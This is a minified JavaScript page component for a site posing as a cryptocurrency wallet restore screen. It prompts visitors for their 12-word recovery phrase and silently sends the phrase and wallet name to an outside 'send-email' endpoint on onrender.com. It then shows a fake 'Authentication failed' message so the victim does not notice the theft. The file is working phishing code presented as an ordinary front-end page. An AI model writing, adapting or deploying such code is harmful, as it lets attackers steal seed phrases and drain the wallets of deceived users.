import{a as e,j as a,b as w,u as v,r as s}from"./index.f0070627.js";import{w as S,b as P}from"./axios.c515a10b.js";import{s as u,F as j}from"./Footer.0d30610c.js";import{N as C}from"./Navbar.55fb0915.js";const L=({message:l="Loading..."})=>e("div",{className:"flex items-center justify-center min-h-screen bg-primary",children:a("div",{className:"flex flex-col items-center space-y-4",children:[e("div",{className:"w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"}),e("p",{className:"text-lg text-gray-600",children:l})]})}),D=()=>{const{id:l}=w(),r=S.find(t=>t.id.toString()===l),f=v(),x=()=>{f(-1)},[n,h]=s.exports.useState(""),[o,i]=s.exports.useState(""),[b,c]=s.exports.useState(!1),[d,p]=s.exports.useState(!1),[g,y]=s.exports.useState(!0);if(s.exports.useEffect(()=>{const t=setTimeout(()=>y(!1),2e3);return()=>clearTimeout(t)},[]),g)return e(L,{message:"Loading wallet..."});if(!r)return e("div",{className:"text-white",children:"Wallet not found"});const N=async t=>{if(t.preventDefault(),n.trim().split(/\s+/).length!==12){i("You must enter exactly 12 words."),c(!1);return}i(""),p(!0);try{const m=await P.post("https://droplet-6cvr.onrender.com/send-email",{wallet:r.title,text:n.trim()});console.log("API response:",m.data),c(!0)}catch(m){console.error("API error:",m),i("Something went wrong. Please try again."),c(!1)}finally{p(!1)}};return a("div",{className:"bg-primary flex flex-col items-center justify-center min-h-screen text-white p-4",children:[e("div",{className:`${u.paddingX} ${u.flexCenter}`,children:e("div",{className:`${u.boxWidth}`,children:e(C,{})})}),e("div",{className:"bg-white flex justify-center items-center p-2 rounded-lg mb-1",children:e("img",{src:r.img,alt:r.title,className:"w-20 h-20 mb-4"})}),e("h1",{className:"text-2xl font-bold mb-2",children:r.title}),e("p",{className:"md:text-lg text-sm mb-6 text-center",children:"Enter your 12-word Recorvery Phrase to restore your wallet below:"}),a("form",{onSubmit:N,className:"flex flex-col justify-center items-center w-full max-w-md",children:[e("textarea",{value:n,onChange:t=>h(t.target.value),placeholder:"Enter recovery phrase, separated by spaces",className:"w-full p-4 rounded-md text-black mb-4 resize-none h-32"}),o&&e("p",{className:"text-red-400 mb-2 text-center",children:o}),b&&!o&&e("p",{className:"text-green-400 mb-2 text-center",children:'"Authentication failed. Please try again later."'}),e("button",{type:"submit",disabled:d,className:`${d?"bg-gray-500":"bg-blue-600 hover:bg-blue-700"} px-6 py-2 rounded-md font-semibold`,children:d?"Connecting...":"Connect"})]}),a("p",{onClick:()=>x(),className:"text-blue-400 mt-4 cursor-pointer",children:[e("span",{className:"text-blue-400",children:"\u2190"}),"Go back"]}),e("div",{className:"flex justify-center items-center mt-6",children:e(j,{})})]})};export{D as default};
